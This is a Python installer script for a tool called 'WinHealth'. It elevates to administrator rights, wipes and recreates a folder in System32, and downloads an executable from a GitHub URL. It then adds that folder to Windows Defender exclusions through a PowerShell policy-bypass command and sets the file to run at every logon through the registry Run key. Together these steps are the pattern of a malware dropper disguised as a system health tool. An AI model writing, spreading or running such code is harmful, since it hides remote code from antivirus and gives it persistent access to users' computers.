#!/usr/bin/env python3
import os
import sys
import ctypes
import subprocess
import urllib.request
from urllib.error import HTTPError, URLError
import winreg
import shutil

WINHEALTH_FOLDER = r"C:\Windows\System32\WinHealth"
TARGET_FILENAME = "winhealth.exe"
TARGET_PATH = os.path.join(WINHEALTH_FOLDER, TARGET_FILENAME)

RAW_URL = "https://github.com/enderhacker/winhealth/raw/main/winhealth.exe"


def show_message(title, text, icon=0):
    """
    icon: 0 = info, 16 = error, 32 = info, 48 = warning
    """
    ctypes.windll.user32.MessageBoxW(0, text, title, icon)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def relaunch_as_admin_and_exit():
    python_exe = sys.executable
    params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
    params = f"--do-install {params}"
    ctypes.windll.shell32.ShellExecuteW(None, "runas", python_exe, params, None, 1)
    sys.exit(0)


def ensure_folder():
    try:
        if os.path.exists(WINHEALTH_FOLDER):
            # Eliminar todo su contenido
            shutil.rmtree(WINHEALTH_FOLDER)
        os.makedirs(WINHEALTH_FOLDER, exist_ok=True)
        return True
    except Exception as e:
        show_message("Error", f"No se pudo crear la carpeta:\n{e}", 16)
        return False


def download_file(url, dest_path):
    try:
        with urllib.request.urlopen(url) as resp:
            if resp.status != 200:
                raise HTTPError(url, resp.status, resp.reason, resp.headers, None)
            with open(dest_path, "wb") as out:
                chunk_size = 8192
                while True:
                    chunk = resp.read(chunk_size)
                    if not chunk:
                        break
                    out.write(chunk)
        return True
    except Exception as e:
        show_message("Error", f"No se pudo descargar el archivo:\n{e}", 16)
        return False


def add_defender_exclusion(folder):
    ps_cmd = f'Add-MpPreference -ExclusionPath "{folder}"'
    try:
        subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                ps_cmd,
            ],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        return True
    except subprocess.CalledProcessError as e:
        stderr = (
            e.stderr.decode(errors="ignore") if getattr(e, "stderr", None) else str(e)
        )
        show_message(
            "Error",
            f"No se pudo agregar la carpeta a exclusiones de Windows Defender:\n{stderr}",
            16,
        )
    except Exception as e:
        show_message("Error", f"No se pudo ejecutar PowerShell:\n{e}", 16)
    return False


def add_to_startup(exe_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WinHealth", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        show_message("Error", f"No se pudo agregar la aplicación al inicio:\n{e}", 16)
        return False


def main_install_flow():
    if not ensure_folder():
        return

    if not download_file(RAW_URL, TARGET_PATH):
        return

    add_defender_exclusion(WINHEALTH_FOLDER)
    add_to_startup(TARGET_PATH)

    show_message(
        "Instalación completada",
        f"WinHealth se instaló correctamente y se ejecutará al inicio.\nCarpeta: {WINHEALTH_FOLDER}",
        32,
    )


if __name__ == "__main__":
    if not is_admin():
        relaunch_as_admin_and_exit()

    main_install_flow()
